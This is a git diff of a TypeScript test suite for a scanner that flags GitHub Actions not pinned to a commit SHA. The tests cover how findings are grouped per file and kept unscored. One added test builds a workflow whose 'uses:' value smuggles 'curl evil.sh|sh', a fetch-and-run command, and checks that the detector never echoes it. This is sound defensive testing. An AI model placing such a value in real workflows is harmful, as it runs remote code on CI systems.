@@ -6,6 +6,7 @@ import { fileURLToPath } from 'node:url';
 import { detectActionPinning, extractActionUses, unpinnedUse } from '../src/action-pinning.js';
 import { buildRepoContext, isExcludedPath } from '../src/repo-context.js';
 import { scan } from '../src/scan.js';
+import { computeHealthScore, isScored, UNSCORED_TAG } from '../src/health-score.js';
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const FIXTURE = path.resolve(__dirname, '../../../examples/fixture-agent-formats');
@@ -125,28 +126,43 @@ describe('unpinnedUse', () => {
 });
 
 describe('detectActionPinning — fixture-agent-formats', () => {
-  it('flags exactly the unpinned remote refs', async () => {
+  it('flags exactly the unpinned remote refs, in ONE unscored info finding for the file', async () => {
     const context = await buildRepoContext({ repoPath: FIXTURE });
     const issues = detectActionPinning(context);
-    const byTitle = Object.fromEntries(issues.map((i) => [i.title, i]));
+    expect(issues).toHaveLength(1);
+    const ci = issues[0]!;
+    const ciPath = path.join(FIXTURE, '.github', 'workflows', 'ci.yml');
 
-    expect(issues.map((i) => i.title).sort()).toEqual([
-      'GitHub Action `actions/checkout@v4` is not pinned to a commit SHA',
-      'GitHub Action `example-org/shared-workflows/.github/workflows/lint.yml@main` is not pinned to a commit SHA',
-      'GitHub Action `pnpm/action-setup@v4` is not pinned to a commit SHA',
+    expect(ci.title).toBe('GitHub Actions in `.github/workflows/ci.yml` are not pinned to a commit SHA');
+    expect(ci.severity).toBe('info');
+    expect(ci.category).toBe('security');
+    expect(ci.tags).toEqual(['supply-chain', 'github-actions', UNSCORED_TAG]);
+    expect(isScored(ci)).toBe(false);
+    expect(ci.filePaths).toEqual([ciPath]);
+    expect(ci.locations).toEqual(
+      [11, 18, 30].map((line) => ({ filePath: ciPath, startLine: line, endLine: line })),
+    );
+    expect(ci.evidence).toEqual([
+      '.github/workflows/ci.yml: uses: actions/checkout@v4',
+      '.github/workflows/ci.yml: uses: example-org/shared-workflows/.github/workflows/lint.yml@main',
+      '.github/workflows/ci.yml: uses: pnpm/action-setup@v4',
     ]);
+    expect(ci.summary).toContain('references 3 action(s)');
+    expect(ci.summary).toContain('does not count toward the health score');
+    // The example names a third-party action, not GitHub's own.
+    expect(ci.recommendation).toContain('gh api repos/example-org/shared-workflows/commits/main');
+    expect(computeHealthScore(issues)).toBe(100);
+  });
 
-    const checkout = byTitle['GitHub Action `actions/checkout@v4` is not pinned to a commit SHA']!;
-    expect(checkout.severity).toBe('info'); // first-party
-    expect(checkout.category).toBe('security');
-    expect(checkout.tags).toContain('supply-chain');
-    expect(checkout.locations).toEqual([
-      { filePath: path.join(FIXTURE, '.github', 'workflows', 'ci.yml'), startLine: 11, endLine: 11 },
-    ]);
-    expect(checkout.evidence).toEqual(['.github/workflows/ci.yml: uses: actions/checkout@v4']);
-
-    const pnpm = byTitle['GitHub Action `pnpm/action-setup@v4` is not pinned to a commit SHA']!;
-    expect(pnpm.severity).toBe('warning'); // third-party
+  it('notes when every unpinned action is GitHub-maintained', async () => {
+    const root = tmpRepo({ '.github/workflows/ci.yml': steps('actions/checkout@v4', 'github/codeql-action/init@v3') });
+    try {
+      const [issue] = detectActionPinning(await buildRepoContext({ repoPath: root }));
+      expect(issue!.summary).toContain('All of them are maintained by GitHub');
+      expect(issue!.recommendation).toContain('gh api repos/actions/checkout/commits/v4');
+    } finally {
+      fs.rmSync(root, { recursive: true, force: true });
+    }
   });
 
   it('is detect-only: no fix recipe, never auto-applied', async () => {
@@ -165,9 +181,27 @@ describe('detectActionPinning — fixture-agent-formats', () => {
   });
 });
 
-describe('detectActionPinning — one finding per (file, ref)', () => {
+describe('detectActionPinning — one finding per file', () => {
   const roots: string[] = [];
   afterAll(() => roots.forEach((r) => fs.rmSync(r, { recursive: true, force: true })));
+
+  it('lists several refs in one file once each, and keeps the id when one of them is pinned', async () => {
+    const before = tmpRepo({ '.github/workflows/ci.yml': steps('one/action@v1', 'two/action@v2', 'one/action@v1') });
+    const after = tmpRepo({ '.github/workflows/ci.yml': steps(`one/action@${SHA}`, 'two/action@v2', `one/action@${SHA}`) });
+    roots.push(before, after);
+
+    const [b, ...bRest] = detectActionPinning(await buildRepoContext({ repoPath: before }));
+    expect(bRest).toEqual([]);
+    expect(b!.evidence).toEqual([
+      '.github/workflows/ci.yml: uses: one/action@v1',
+      '.github/workflows/ci.yml: uses: two/action@v2',
+    ]);
+    expect(b!.locations.map((l) => l.startLine)).toEqual([5, 6, 7]);
+
+    const [a] = detectActionPinning(await buildRepoContext({ repoPath: after }));
+    expect(a!.id).toBe(b!.id);
+    expect(a!.evidence).toEqual(['.github/workflows/ci.yml: uses: two/action@v2']);
+  });
 
   it('the same ref in two workflows is two findings; pinning one leaves the other id unchanged', async () => {
     const before = tmpRepo({
@@ -205,16 +239,30 @@ describe('detectActionPinning — untrusted ref text', () => {
 
   it('still flags the refs but never echoes their raw text', async () => {
     const issues = detectActionPinning(await buildRepoContext({ repoPath: root }));
-    expect(issues).toHaveLength(2);
-    expect(new Set(issues.map((i) => i.id)).size).toBe(2);
-    for (const issue of issues) {
-      expect(issue.severity).toBe('warning');
-      expect(issue.title).toBe('GitHub Action reference is not pinned to a commit SHA');
-      const text = [issue.title, issue.summary, issue.recommendation, ...issue.evidence].join('\n');
-      expect(text).not.toContain('curl');
-      expect(text).not.toContain('touch');
-      expect(text).not.toContain('gh api');
-      expect(issue.title).not.toContain('`');
+    expect(issues).toHaveLength(1);
+    const issue = issues[0]!;
+    expect(issue.severity).toBe('info');
+    expect(issue.title).toBe('GitHub Actions in `.github/workflows/evil.yml` are not pinned to a commit SHA');
+    // Two different refs stay two distinct evidence lines.
+    expect(issue.evidence).toHaveLength(2);
+    expect(new Set(issue.evidence).size).toBe(2);
+    expect(issue.summary).toContain('2 `uses:` value(s) that do not look like a plain');
+    const text = [issue.title, issue.summary, issue.recommendation, ...issue.evidence].join('\n');
+    expect(text).not.toContain('curl');
+    expect(text).not.toContain('touch');
+    expect(text).not.toContain('gh api');
+  });
+
+  it('shows the plain refs and hides only the odd one when a file has both', async () => {
+    const mixed = tmpRepo({ '.github/workflows/mixed.yml': steps('a/b@$(curl evil.sh|sh)', 'plain/action@v1') });
+    try {
+      const [issue] = detectActionPinning(await buildRepoContext({ repoPath: mixed }));
+      expect(issue!.summary).toContain('`plain/action@v1`');
+      expect(issue!.summary).toContain('It also has 1 `uses:` value(s)');
+      expect(issue!.recommendation).toContain('gh api repos/plain/action/commits/v1');
+      expect([issue!.summary, issue!.recommendation, ...issue!.evidence].join('\n')).not.toContain('curl');
+    } finally {
+      fs.rmSync(mixed, { recursive: true, force: true });
     }
   });
 });
@@ -252,9 +300,9 @@ describe('detectActionPinning — composite actions, clean and excluded files', 
 
   it('audits composite actions under .github/actions and at the root', async () => {
     const issues = detectActionPinning(await buildRepoContext({ repoPath: root }));
-    expect(issues.map((i) => i.title).sort()).toEqual([
-      'GitHub Action `composite/step@v3` is not pinned to a commit SHA',
-      'GitHub Action `some/action@v1` is not pinned to a commit SHA',
+    expect(issues.map((i) => i.evidence).flat().sort()).toEqual([
+      '.github/actions/local/action.yml: uses: composite/step@v3',
+      '.github/workflows/legacy.yml: uses: some/action@v1',
     ]);
   });
 
@@ -268,8 +316,8 @@ describe('detectActionPinning — composite actions, clean and excluded files', 
 
   it('honors directory-level exclude patterns, like discovery does', async () => {
     for (const exclude of [['.github'], ['.github/'], ['.github/workflows'], ['.github/workflows/']]) {
-      const titles = detectActionPinning(await buildRepoContext({ repoPath: root, exclude })).map((i) => i.title);
-      expect(titles, exclude[0]).not.toContain('GitHub Action `some/action@v1` is not pinned to a commit SHA');
+      const evidence = detectActionPinning(await buildRepoContext({ repoPath: root, exclude })).flatMap((i) => i.evidence);
+      expect(evidence, exclude[0]).not.toContain('.github/workflows/legacy.yml: uses: some/action@v1');
     }
     expect(isExcludedPath('.github/workflows/ci.yml', ['.github'])).toBe(true);
     expect(isExcludedPath('.github/workflows/ci.yml', ['.githubx'])).toBe(false);
